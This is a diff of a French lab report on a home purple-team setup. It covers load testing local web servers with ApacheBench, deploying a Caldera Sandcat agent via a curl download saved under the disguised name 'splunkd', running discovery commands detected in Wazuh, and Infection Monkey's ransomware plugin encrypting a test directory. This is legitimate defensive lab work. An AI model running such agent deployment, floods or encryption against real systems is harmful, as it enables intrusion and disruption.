@@ -344,25 +344,14 @@ ab -n 10000 -c 100 http://127.0.0.1/ &
 ```
 (le `&` lance en arrière-plan — surveille `top`/`htop`)
 
-##### 3) Test agressif (⚠️ très lourd — n’utiliser que si tu as suffisamment de ressources)
-Remplace `10.153.226.8` par l’IP de ta VM si `ab` est lancé depuis une autre machine.  
+##### 3) Test agressif (lourd)
+ 
 ```bash
 ab -n 10000000 -c 1000 http://127.0.0.1:8080/ &
 ab -n 10000000 -c 1000 http://127.0.0.1:9090/ &
 ab -n 10000000 -c 1000 http://127.0.0.1/ &
 ```
 
-##### 4) Lancer proprement en arrière-plan (recommandé si session SSH)
-```bash
-nohup ab -n 10000000 -c 1000 http://127.0.0.1:8080/ > nginx_ab_8080.log 2>&1 &
-nohup ab -n 10000000 -c 1000 http://127.0.0.1:9090/ > httpd_ab_9090.log 2>&1 &
-nohup ab -n 10000000 -c 1000 http://127.0.0.1/    > caddy_ab_80.log 2>&1 &
-```
-
-Pour arrêter tous les `ab` :
-```bash
-pkill ab
-```
 
 #### 4 — Surveillance & vérifications pendant le test
 
@@ -375,6 +364,8 @@ Dans **Netdata** (`http://localhost:19999`) :
 ![alt text](image-1.png)
 ![alt text](image-2.png)
 
+Des performances "normales", *windows* est en premier en consommation de RAM car dans notre *docker-compose.yml* on a lancé un Windows Server 2019.
+
 **Pendant le stress test** :
 ![alt text](image-3.png)
 ![alt text](image-5.png)
@@ -386,7 +377,7 @@ Dans **Netdata** (`http://localhost:19999`) :
 - **Disk I/O élevé** → logs/Indexing qui sature le disque (Wazuh Indexer peut générer I/O).  
 - **Network I/O** → pics pendant benchs (exfil possible si simulateur d’exfil). 
 
-Ce premier stress test valide la visibilité de l’infrastructure via Netdata et montre la montée en charge maîtrisée des conteneurs. Il sert de point de référence pour mesurer l’impact des futures opérations offensives.
+Ce stress test valide la visibilité de l’infrastructure via Netdata et montre la montée en charge maîtrisée des conteneurs.
 
 ---
 ### B. **Caldera & Wazuh**
@@ -416,7 +407,7 @@ On peut enfin se connecter :
 #### 2 — Déploiement Sandcat - HTTP
 **But** : déployer un agent Sandcat HTTP sur une cible (Linux / Windows / Mac) et vérifier qu'il beacon vers le C2.
 
-On execute l'agent : 
+On exécute l'agent depuis notre VM : 
 ```bash
 server="http://127.0.0.1:8888";
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
@@ -428,36 +419,58 @@ L'agent s'est bien déployé :
 ![alt text](image-9.png)
 ![alt text](image-10.png)
 
-xx
-
 #### 3 — Déploiement opération
-
+On créé une opération qui va exécuter des commandes "discovery" sur la machine (whoami etc...)
 ![alt text](image-11.png)
-On créé une opération qui va simuler des commandes "discovery" sur la machine (whoami etc...)
-![alt text](image-14.png)
 
-L'opération se lance bien avec un ensemble de commandes qui s'executent !
-On a aussi la possibilité d'en exécuter manuellement.
+![alt text](image-14.png)
+![alt text](image-33.png)
+L'opération se lance bien avec un ensemble de commandes qui s'exécutent !
+On a aussi la possibilité d'en lancer manuellement.
 
 #### 3 — Wazuh
 On se rend sur https://localhost et on se connecte avec les credentials par défaut : 
 ![alt text](image-18.png)
 On arrive sur l'interface global :
 ![alt text](image-16.png)
-On observe que notre agent est bien présent et on peut analyser ça :
+On observe que notre agent est bien présent et on peut analyser les remontées via l'onglet "Threat Hunting" :
 ![alt text](image-15.png)
+
+On voit bien les remontées d'informations directement sur notre interface :
+
+![alt text](image-26.png)
 ![alt text](image-17.png)
 
-On voit bien les remontées d'informations directement sur notre interface !
 Les exécutions de notre opération passant par notre agent précédemment créé sont détectées !
 
-### B. **Monkey**
+### C. **Infection Monkey**
 #### Objectif
+Infection Monkey (Guardicore) est un simulateur d'attaques autonome. Il permet de configurer des agents, définir des cibles, et exécuter des scénarios (ex : chiffrement de fichiers) pour évaluer la résilience et la détection.
 
+#### 1 — Credentials & connexion
+Paramètres importants :
 
-
-
+Scan target list : définition des IP/hôtes à scanner.
+Scan Agent's networks : option à cocher si l'agent doit scanner ses interfaces.
+File extension : .m0nk3y (extension appliquée aux fichiers chiffrés).
+Linux target directory : /tmp/monkey_demo (ou /home/user/vault selon configuration).
 
 ![alt text](image-19.png)
+
+On télécharge tous les plugins safe puis on active le plugin *ransomware* :
 ![alt text](image-22.png)
+ 
 ![alt text](image-23.png)
+
+On définit notre cible et on exécute :
+![alt text](image-27.png)
+
+![alt text](image-34.png)
+
+Après l'exécution, on observe les fichiers dans le répertoire cible :
+![alt text](image-29.png)
+![alt text](image-30.png)
+
+Tout a été chiffré et un *README.md* est présent, on peut observer le rapport sur l'interface également :
+![alt text](image-31.png)
+![alt text](image-32.png)
